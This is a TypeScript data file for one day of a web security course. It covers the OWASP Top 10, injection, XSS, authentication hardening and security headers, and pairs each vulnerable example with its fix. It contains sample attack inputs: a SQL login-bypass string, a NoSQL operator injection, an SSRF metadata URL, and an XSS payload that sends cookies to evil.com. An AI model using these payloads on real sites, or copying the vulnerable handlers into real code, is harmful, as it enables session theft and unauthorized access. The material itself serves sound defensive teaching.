import type { RoadmapDayDetail } from "../challenge-data";

export const DAY_25_DETAIL = {
  overview: [
    "Security is not a feature you add at the end — it is a property you design in from the start. The OWASP Top 10 is the most widely referenced list of web application vulnerabilities, updated every few years based on real-world breaches. Understanding these categories helps you recognize dangerous patterns in your own code before an attacker does.",
    "Today covers the most important OWASP vulnerabilities, how injection attacks actually work, why broken authentication is still the top cause of breaches, and the key defensive practices — input validation, parameterized queries, security headers, and least privilege — that prevent the majority of attacks.",
  ],
  sections: [
    {
      title: "Watch",
      blocks: [
        { type: "youtube", videoId: "kdTkj6DdbCg", title: "OWASP Top 10 Web Vulnerabilities Explained" },
      ],
    },
    {
      title: "OWASP Top 10 — the most common vulnerabilities",
      blocks: [
        {
          type: "table",
          caption: "You do not need to memorize rankings — focus on understanding how each attack works.",
          headers: ["Category", "What it means", "Simple example", "Primary defense"],
          rows: [
            ["Broken Access Control", "Users can perform actions or access data they should not be allowed to", "User A can view User B's profile by changing the URL from /users/1 to /users/2", "Check permissions on every request, not just at login; enforce at the server, not client"],
            ["Cryptographic Failures", "Sensitive data exposed because it is not encrypted or uses weak encryption", "Passwords stored as MD5 hashes; HTTP instead of HTTPS; private keys in the git repo", "Use bcrypt/Argon2 for passwords; enforce HTTPS; never commit secrets"],
            ["Injection", "Untrusted data is sent to an interpreter as a command", "SQL: WHERE name = ''+DROP TABLE users--; XSS: <script>steal(document.cookie)</script>", "Parameterized queries; output encoding; input validation"],
            ["Insecure Design", "Flaws in the fundamental architecture — cannot be patched away", "No rate limiting on the forgot-password flow allows account enumeration at scale", "Threat modeling before building; security requirements in design phase"],
            ["Security Misconfiguration", "Default settings, missing hardening, verbose error messages, open cloud storage buckets", "S3 bucket with public read enabled; production app returning full stack traces to users", "Disable defaults; minimize exposed attack surface; never show internal errors to users"],
            ["Vulnerable Components", "Using libraries or frameworks with known CVEs", "An old version of lodash with a prototype pollution vulnerability", "Run npm audit regularly; pin versions; update dependencies; monitor CVE feeds"],
            ["Authentication Failures", "Weak or missing authentication — session hijacking, credential stuffing, broken logout", "No rate limiting on login allows brute-force attacks; JWTs signed with 'none' algorithm", "Rate limit login; MFA; secure session management; reject weak JWT algorithms"],
            ["Software Integrity Failures", "Code or pipeline updates without integrity checks", "CI pipeline uses a third-party GitHub Action that was compromised", "Pin Actions to commit SHA; verify package checksums; sign artifacts"],
            ["Logging & Monitoring Failures", "Insufficient logging means breaches go undetected for months", "No alerts on repeated failed login attempts; successful data exfiltration not logged", "Log auth events, access to sensitive data, and admin actions; alert on anomalies"],
            ["Server-Side Request Forgery (SSRF)", "Server is tricked into making requests to internal resources on behalf of the attacker", "User provides a URL, app fetches it: http://169.254.169.254/latest/meta-data/ (AWS metadata)", "Validate and allowlist URLs; block requests to private IP ranges; disable redirects"],
          ],
        },
      ],
    },
    {
      title: "Injection attacks in depth",
      blocks: [
        {
          type: "paragraph",
          text: "Injection is the top class of web vulnerabilities. An injection attack happens when untrusted user input is interpreted as code or a command by the application. SQL injection, NoSQL injection, command injection, and XSS are all variations of the same root problem: the application does not clearly separate data from instructions.",
        },
        {
          type: "code",
          title: "SQL injection — vulnerable vs safe",
          code: `// ❌ VULNERABLE — string concatenation lets attackers inject SQL
// Input: username = "admin'--" → logs in as admin without password
app.post("/login", async (req, res) => {
  const { username, password } = req.body;
  const query = \`SELECT * FROM users WHERE username = '\${username}' AND password = '\${password}'\`;
  const user = await db.raw(query);  // attacker controls the SQL!
  // With username="admin'--", query becomes:
  // SELECT * FROM users WHERE username = 'admin'--' AND password = '...'
  // -- comments out the password check → always logs in as admin
});

// ✅ SAFE — parameterized query: database handles escaping, never interpolates
app.post("/login", async (req, res) => {
  const { username, password } = req.body;
  const user = await db("users")
    .where({ username, password: hashPassword(password) })
    .first();
  // Or with raw SQL using placeholders:
  const user = await db.raw(
    "SELECT * FROM users WHERE username = ? AND password_hash = ?",
    [username, hashPassword(password)]
  );
  if (!user) return res.status(401).json({ error: "Invalid credentials" });
  res.json({ token: generateJWT(user) });
});

// ❌ NoSQL injection — same problem in MongoDB
// Input: { "username": { "$gt": "" } } matches every user
await User.findOne({ username: req.body.username });

// ✅ Safe — validate input type; sanitize operator injection
const username = String(req.body.username);  // force to string, never an object
await User.findOne({ username });`,
        },
        {
          type: "code",
          title: "XSS — output encoding prevents stored/reflected attacks",
          code: `// ❌ VULNERABLE — rendering user content without encoding
app.get("/posts/:id", async (req, res) => {
  const post = await Post.findById(req.params.id);
  res.send(\`<h1>\${post.title}</h1><div>\${post.body}</div>\`);
  // If post.body = <script>document.location='https://evil.com?c='+document.cookie</script>
  // → the browser executes the script and sends cookies to the attacker
});

// ✅ Safe options:
// 1. Use a template engine with auto-escaping (Handlebars, EJS with <%= %>, Nunjucks)
// 2. Set Content-Type: application/json for API responses — the browser won't execute JSON as HTML
// 3. Use DOMPurify on the frontend when rendering user HTML
// 4. Set Content-Security-Policy header to restrict script sources

// CSP header example — only allow scripts from your own domain
res.setHeader(
  "Content-Security-Policy",
  "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:"
);`,
        },
      ],
    },
    {
      title: "Broken authentication patterns",
      blocks: [
        {
          type: "list",
          variant: "bullet",
          items: [
            "No rate limiting on login allows brute-force attacks. Use express-rate-limit or a WAF to limit login attempts to 5 per minute per IP, with progressive lockout.",
            "Weak or predictable session tokens can be guessed. Use crypto.randomUUID() or a dedicated session library — never increment a counter or use the user ID as a session token.",
            "JWTs accepting the 'none' algorithm are completely insecure. Always explicitly specify the algorithm when verifying: jwt.verify(token, secret, { algorithms: ['HS256'] }). Reject tokens where alg is 'none' or 'RS256' when you expect 'HS256'.",
            "Password reset links that never expire allow attackers who intercept a reset email to use it days later. Set a short TTL (15-60 minutes) and single-use tokens.",
            "Not hashing passwords with bcrypt means a database breach exposes all user passwords. MD5 and SHA-1 are not acceptable for password storage — use bcrypt (cost factor 10+), Argon2id, or scrypt.",
          ],
        },
        {
          type: "code",
          title: "Defense-in-depth authentication checklist (Express)",
          code: `import rateLimit from "express-rate-limit";
import bcrypt from "bcrypt";
import jwt from "jsonwebtoken";

// 1. Rate limit login endpoint
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 10,                     // 10 attempts per IP per window
  message: { error: "Too many login attempts, try again in 15 minutes" },
});
app.post("/auth/login", loginLimiter, loginHandler);

// 2. Hash passwords properly
async function registerUser(email: string, password: string) {
  const hash = await bcrypt.hash(password, 12);  // cost factor 12
  await db.users.insert({ email, passwordHash: hash });
}

// 3. Verify JWT with explicit algorithm
function verifyToken(token: string) {
  return jwt.verify(token, process.env.JWT_SECRET!, {
    algorithms: ["HS256"],   // reject RS256, none, or any other algorithm
    audience: "api.example.com",
    issuer:   "auth.example.com",
  });
}

// 4. Constant-time comparison for tokens (prevent timing attacks)
import { timingSafeEqual } from "crypto";

function safeCompare(a: string, b: string): boolean {
  const aBuf = Buffer.from(a);
  const bBuf = Buffer.from(b);
  if (aBuf.length !== bBuf.length) return false;
  return timingSafeEqual(aBuf, bBuf);
}`,
        },
      ],
    },
    {
      title: "Security headers and dependency scanning",
      blocks: [
        {
          type: "table",
          headers: ["Header", "What it does", "Example value"],
          rows: [
            ["Content-Security-Policy", "Restricts which scripts, styles, and resources the browser can load — blocks most XSS attacks", "default-src 'self'; script-src 'self'; object-src 'none'"],
            ["Strict-Transport-Security", "Forces HTTPS for a specified duration — prevents SSL stripping and mixed content", "max-age=31536000; includeSubDomains; preload"],
            ["X-Content-Type-Options", "Prevents browsers from MIME-sniffing responses — forces the declared Content-Type", "nosniff"],
            ["X-Frame-Options", "Prevents clickjacking by disallowing the page from being embedded in an iframe", "DENY or SAMEORIGIN"],
            ["Referrer-Policy", "Controls how much referrer information is included in requests — prevents leaking internal paths", "strict-origin-when-cross-origin"],
            ["Permissions-Policy", "Restricts access to browser APIs like camera, microphone, and geolocation", "camera=(), microphone=(), geolocation=()"],
          ],
        },
        {
          type: "list",
          variant: "bullet",
          items: [
            "Use the helmet npm package in Express — it sets all of the above headers with safe defaults in one line: app.use(helmet()).",
            "Run npm audit in CI and fail the build on high-severity vulnerabilities. Add it as a required status check in GitHub branch protection rules.",
            "Use Dependabot or Renovate to automatically create PRs for dependency updates — do not let dependencies go months without updates.",
            "Use a tool like Snyk or socket.security to scan for both known CVEs and suspicious package behavior (typosquatting, supply-chain attacks).",
          ],
        },
      ],
    },
  ],
  faq: [
    {
      question: "What is SQL injection and how do you prevent it?",
      tag: "Injection",
      answer: [
        "SQL injection happens when user-supplied input is concatenated directly into a SQL query string. The attacker includes SQL syntax in their input (like a closing quote and comment sequence) that changes the meaning of the query — bypassing authentication, reading other users' data, or deleting tables.",
        "Prevention: always use parameterized queries or an ORM that handles escaping automatically. Never concatenate user input into SQL strings. Treat all user input as untrusted data, not as SQL syntax.",
      ].join("\n\n"),
      callout: "Parameterized queries are not optional. If your query contains string concatenation with user input, it is vulnerable.",
    },
    {
      question: "What is the difference between XSS and CSRF?",
      tag: "Client-side attacks",
      answer: [
        "XSS (Cross-Site Scripting): an attacker injects malicious JavaScript into your site that runs in other users' browsers. The script can steal cookies, capture keystrokes, or make requests on the user's behalf. Prevented by output encoding and Content-Security-Policy headers.",
        "CSRF (Cross-Site Request Forgery): an attacker tricks a logged-in user's browser into making a request to your site that the user did not intend. Since the browser automatically sends cookies, the request is authenticated. Prevented by SameSite=Strict cookies, CSRF tokens, and verifying the Origin header on state-changing requests.",
      ].join("\n\n"),
    },
    {
      question: "What are IDOR vulnerabilities?",
      tag: "Access control",
      answer: [
        "IDOR (Insecure Direct Object Reference) happens when an API endpoint uses a predictable resource ID in the URL and does not check whether the requesting user has permission to access that resource. Changing /api/orders/1234 to /api/orders/1235 in the browser shows another user's order.",
        "Prevention: always enforce authorization on every request, not just at login. Check that the authenticated user owns or has permission to access the specific resource being requested. Never assume that a user who can list resources can access any individual resource — check each one.",
      ].join("\n\n"),
      callout: "Authentication (who are you?) is not the same as authorization (are you allowed to do this?). Check both.",
    },
    {
      question: "What is defense in depth?",
      tag: "Security principles",
      answer: [
        "Defense in depth means layering multiple independent security controls so that if one fails, others still protect the system. No single control is perfect — a WAF might be bypassed, a firewall misconfigured, or a library have a zero-day. With multiple layers, an attacker who bypasses the perimeter still faces authentication, then authorization, then data encryption, then audit logging.",
        "Practical layers: network firewall → WAF → authentication → authorization (RBAC) → input validation → parameterized queries → encryption at rest → audit logging. Each layer independently reduces risk.",
      ].join("\n\n"),
    },
  ],
  bullets: [
    "Audit a sample Express app for OWASP vulnerabilities — find at least 3 issues (e.g. missing rate limiting, unparameterized query, missing security headers) and fix each one.",
    "Add helmet to a Node.js app and use curl -I to verify all security headers appear in the response.",
    "Run npm audit on a real project, identify any high-severity vulnerabilities, and update the affected packages.",
  ],
} satisfies RoadmapDayDetail;
